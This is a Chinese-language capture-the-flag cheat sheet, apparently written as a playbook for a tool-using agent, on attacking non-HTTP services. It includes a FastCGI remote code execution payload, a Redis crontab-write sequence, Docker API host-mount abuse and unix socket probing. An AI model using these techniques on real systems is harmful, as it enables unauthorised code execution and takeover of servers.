# 非 HTTP 服务：往往才是主线

## 为什么必须先扫端口

题面写的是 Web 应用，但真正的入口常常是一个**没有经过前置网关**的服务：

- 认证只在 80/443 的网关做，后端服务直接暴露在别的端口
- 老服务（php-fpm、Redis、Docker API）默认不做鉴权
- "网关迁移/升级/切流"这类措辞，几乎都在暗示旁路端口

**规则：任何目标，`ports(host)` 与 `recon(url)` 同时发。**

## 常见服务与打法

| 端口 | 服务 | 打法 |
|---|---|---|
| 9000 | php-fpm / FastCGI | `fcgi(host,port)` 直接执行 PHP：`PHP_VALUE=auto_prepend_file=php://input` + `allow_url_include=On` |
| 5000/5001 | Flask / 内部 API | 直接请求，枚举 `/debug/config`、`/status`、`/admin/info` |
| 6379 | Redis | 无密码：`CONFIG GET dir`、写 crontab / authorized_keys / webshell、`SLAVEOF` 主从 RCE |
| 2375/2376 | Docker API | `/containers/json`、`/containers/create` 挂载宿主机根目录 |
| 11211 | memcached | `stats items` 拿 key 列表，常缓存 session |
| 3306/5432/27017 | MySQL/PG/Mongo | 配置里泄露的凭据直连；Mongo 常无鉴权 |
| 8080/8000/8888 | 备用 Web | 常常是没做鉴权的管理面 |
| 22 | SSH | 泄露的私钥/口令 |

## FastCGI 要点

```
SCRIPT_FILENAME=/var/www/html/index.php     # 必须是站点里真实存在的 .php
REQUEST_METHOD=POST
PHP_VALUE=auto_prepend_file=php://input     # stdin 当脚本执行
PHP_ADMIN_VALUE=allow_url_include=On
body = <?php echo shell_exec('id'); exit;
```

记录头是 **6 个字段**：`version(B) type(B) requestId(H) contentLength(H) paddingLength(B) reserved(B)`。
少写 padding/reserved 就解析失败。工具 `fcgi` 已封装，也支持探活（发完整一轮才不静默）。

## Unix socket

容器内很多"本地 agent"只监听 unix socket（权限往往 777，无需认证）：

```
find / -name "*.sock" 2>/dev/null
/run/<app>/*.sock   /var/run/*.sock   /tmp/*.sock
```

用 `unix(socket=..., path=...)` 直接发 HTTP 请求。

## Redis 无密码速查

```
redis-cli -h HOST
CONFIG GET dir
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n* * * * * /bin/bash -c 'cat /flag > /tmp/o'\n"
SAVE
```

## 裸 TCP 调试

`raw(host, port, payload=...)` 可发文本或 hex，用于自研协议/自写 FastCGI/Redis 握手。
